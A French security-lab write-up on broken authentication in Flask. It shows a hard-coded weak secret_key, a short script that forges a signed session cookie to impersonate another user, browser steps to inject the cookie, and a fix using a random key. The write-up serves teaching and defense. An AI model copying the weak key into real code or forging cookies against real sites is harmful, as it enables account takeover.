# Faille 02 — Broken Authentication

## Concept

Flask stocke les données de session dans un cookie signé avec `app.secret_key`.
Le cookie est lisible (base64, pas chiffré) mais ne devrait pas être falsifiable
sans connaître la clé. Si cette clé est faible ou prévisible, un attaquant peut
forger un cookie valide et se connecter en tant que n'importe quel utilisateur.

## Code vulnérable

```python
app.secret_key = "secret"
```

## Exploit

Le cookie de session alice décodé :
```
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFsaWNlIn0  →  {"user_id": 1, "username": "alice"}
```

Script de forge (voir `exploit_session.py`) :
```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "secret"   # clé devinée

serializer = SecureCookieSessionInterface().get_signing_serializer(app)
forged = serializer.dumps({"user_id": 2, "username": "bob"})
# → cookie valide pour bob, sans jamais connaître son mot de passe
```

Injection dans le navigateur : F12 → Application → Cookies → remplacer la valeur `session`.

## Fix

```python
import secrets
app.secret_key = secrets.token_hex(32)  # 256 bits d'entropie
```

**Pourquoi ça corrige :**
`token_hex(32)` génère 32 octets aléatoires via le CSPRNG du système d'exploitation.
Tester toutes les combinaisons possibles prendrait plus longtemps que l'âge de l'univers.
L'attaquant ne peut plus signer de cookie même en connaissant le format.

**Limite du fix :** la clé change à chaque redémarrage → toutes les sessions sont invalidées.
En production, on la stocke dans une variable d'environnement (voir faille 08).

## Classification

- **OWASP Top 10 :** A07:2021 — Identification and Authentication Failures
- **CWE :** CWE-331 — Insufficient Entropy, CWE-798 — Use of Hard-coded Credentials
- **Impact :** Usurpation d'identité, élévation de privilèges

## Ressources

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Flask — Sessions](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)
